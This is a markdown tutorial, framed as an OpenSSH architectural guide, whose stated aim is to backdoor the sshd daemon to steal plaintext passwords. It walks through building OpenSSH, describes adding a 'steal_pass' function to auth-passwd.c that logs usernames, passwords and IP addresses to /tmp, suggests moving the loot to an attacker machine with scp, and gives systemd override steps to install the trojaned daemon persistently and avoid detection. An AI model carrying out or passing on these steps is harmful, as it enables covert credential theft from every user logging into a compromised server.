

# OpenSSH Deployment, Architectural Analysis Guide
# Learning how to manipulate the OpenSSH open-source code in order to gain access to the connecting party's plaintext password.

## 1. Introduction to SSH and OpenSSH
Secure Shell (SSH) is a cryptographic network protocol designed to operate network services securely over an unsecured network. It establishes an encrypted tunnel between a client and a server, safeguarding data integrity and confidentiality against eavesdropping, man-in-the-middle attacks, and connection hijacking. 

OpenSSH is the industry-standard, open-source implementation of the SSH protocol suite. Developed primarily by the OpenBSD project, it provides a heavily scrutinized, cryptographically sound alternative to legacy plaintext tools (like Telnet and FTP). The OpenSSH suite includes the server daemon (`sshd`), the client application (`ssh`), and various utilities for secure file transfer (`scp`, `sftp`) and key management (`ssh-keygen`).

## 2. Source Code Analysis: Password Transmission & Authentication
In the SSHv2 protocol, passwords are transmitted as plaintext, but only *after* a secure, symmetrically encrypted transport tunnel has been established. Once the secure layer is finalized, the client encapsulates the raw password inside an `SSH_MSG_USERAUTH_REQUEST` packet. This packet is encrypted using the session's cipher before transmission, guaranteeing cryptographic confidentiality.

Authentication logic is executed entirely on the server side. Upon receiving the packet, the `sshd` daemon decrypts the payload and delegates credential verification to the operating system's native mechanisms, such as Pluggable Authentication Modules (PAM) or shadow passwords. 

### The Strategic Importance of `auth-passwd.c`
Within the OpenSSH source tree, `auth-passwd.c` is a highly critical module. 
*   **Role:** It acts as the definitive bridge between the decrypted SSH protocol payload and the underlying operating system's authentication subsystem. It receives the plaintext password provided by the user, interfaces with PAM or native hashing functions, and determines the success or failure of the login attempt.
*   **Protections:** Because it handles raw plaintext passwords, this module operates under strict security paradigms. Modern OpenSSH implementations utilize privilege separation, isolating this authentication logic into an unprivileged child process that communicates via Inter-Process Communication (IPC). Furthermore, the C source code is strictly engineered to wipe passwords from dynamic memory (using functions like `explicit_bzero` or `memset`) immediately after verification to prevent memory scraping or core dump leaks.
*   **Vulnerabilities & Weaknesses:** As a component written in C that interacts with external OS libraries, it is theoretically exposed to memory safety vulnerabilities such as buffer overflows or out-of-bounds reads, although extensive auditing makes these rare. Its primary strategic weakness lies in post-compromise execution environments. If a system is compromised, an attacker can reverse engineer and patch the `sshd` binary, hooking the validation functions within `auth-passwd.c`. This allows the deployment of a malicious SSH daemon that intercepts and logs plaintext credentials directly from memory before the wiping functions are executed.

## 3. Cloning and Local Build of OpenSSH
Download the portable OpenSSH repository and compile it for localized execution, keeping it isolated from the host OS standard binaries.
```bash
# Install required build dependencies (compiler, zlib, OpenSSL headers)
sudo apt update && sudo apt install -y build-essential zlib1g-dev libssl-dev autoconf

# Clone the official portable OpenSSH repository
git clone [https://github.com/openssh/openssh-portable.git](https://github.com/openssh/openssh-portable.git)
cd openssh-portable

# Generate the configure script and build for an isolated local directory
autoreconf -i
./configure --prefix=$(pwd)/local_build
make
make install

```

## 4. Modifying the file 'auth-passwd.c' to leak the plaintext passwords

The modified file can be found in the same directory as this markdown.

# The modification I made:

1. I added a function "steal_pass" thats recives the plaintext password and useful information about the user, such as username and I.P. address, which can be used to connect their account, the function write the data to ```text /tmp/stolen_creds.txt ``` (Using auth-passwd.c process privileges and the fact /tmp/ directory does not require root permisions to modify its content, although it is volatile and must be moved to somewhere safer to continue the hack, such as a listening server or the attacker file system).

2. I made several calls to this function to cover all options the password can be intercepted using different authentication modules.


## 5. Copying Files via SCP (Secure Copy Protocol)

If you need to transfer data securely ( ;-) ) over an encrypted SSH transport layer between 2 machines (for example attacker and target machines:

```bash
# Push a local file to a remote machine
scp /path/to/local_file.txt user@remote_host:/path/to/remote_directory/

# Pull a remote file to the local machine
scp user@remote_host:/path/to/remote_file.txt /path/to/local_directory/

# Copy an entire directory recursively
scp -r /path/to/local_dir user@remote_host:/path/to/remote_dir

```

## 6. Rebuilding and Installing OpenSSH System-Wide

After altering the 'auth-passwd.c' file, you need to rebuild the repository and get the new malicious 'sshd' (Daemon)

Clean previous local object files and reconfigure the build environment to integrate directly with standard OS directories (`/usr/local` for binaries, `/etc/ssh` for configurations).

```bash
cd openssh-portable

# Clean the previous local build artifacts
make clean

# Configure the build for system-wide integration
./configure --prefix=/usr/local --sysconfdir=/etc/ssh --with-ssl-dir=/usr/include/openssl

# Compile the source code
make

# Install the binaries to the system paths (requires elevated privileges)
sudo make install

```


## 7. Overriding the System `sshd` Binary Source

When you have the new executable 'sshd' files, you need to place it instead (or in addition) to the original one in the target file system.

Locate it in the same directory as the original daemon, it can be found by the following command, after 'ExecStart' or below 'CGroup':

```bash
systemctl status ssh

```

Alternatively you can use the following command to locate the 'sshd' binary that is currently in use, according to the $PATH environment variable:

```bash
which sshd
```

Modify the systemd service unit to execute a newly compiled `sshd` binary instead of the default OS package manager version.

```bash
# Open an override file for the SSH daemon service to prevent OS updates from overwriting your changes
sudo systemctl edit ssh.service

```

Add the following lines to flush the default execution path and map it to your custom binary:

```ini
[Service]
ExecStart=
ExecStart=/usr/local/sbin/sshd -D $SSHD_OPTS

```

The path '/usr/local/sbin/sshd' should be the path to your altered daemon.

The flag '-D' forces the process to remain attached to the foreground and keeps the current configurations, such as the 'ssh keys' and prevents system from dedecting the attack.

```bash
# Reload the systemd manager configuration and restart the daemon
sudo systemctl daemon-reload
sudo systemctl restart ssh

```

*Now, every user connecting the machine via ssh using password authentication, will be exposed!*

